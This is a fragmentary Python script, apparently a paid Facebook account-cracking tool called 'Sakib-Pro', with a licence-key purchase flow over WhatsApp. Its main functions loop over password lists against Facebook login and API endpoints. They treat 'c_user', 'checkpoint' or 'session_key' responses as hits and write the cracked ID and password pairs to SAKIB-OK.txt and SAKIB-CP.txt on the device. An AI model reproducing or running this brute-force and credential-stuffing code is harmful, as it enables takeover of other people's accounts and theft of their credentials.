...
----------------------------------------------
 Author    : Sakib
 Github    : Sakibbhai1234
 Facebook  : Md Najmus Sakib 
 Tool Name : Sakib-Pro
 Type type : PAID
 Version   : 1.9.8
----------------------------------------------
 Sakib Pro version 1.9.8
 For Haters: Age Level e Ai Tarpor Asis🤞
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://www.facebook.com/profile.php?id=100001487304934');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+8801316165549&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi Sakib Sir, I Need To Buy Your Paid Sakib PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [SAKIB-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [SAKIB-OK] %s | %s'%(ids,pas))
                                open('/sdcard/SAKIB-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [SAKIB-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SAKIB-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [SAKIB-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SAKIB-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/Sakib-Ok.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [SAKIB-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/SAKIB-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [SAKIB-OK] '+uid+' | '+pas+'\033[1;97m')
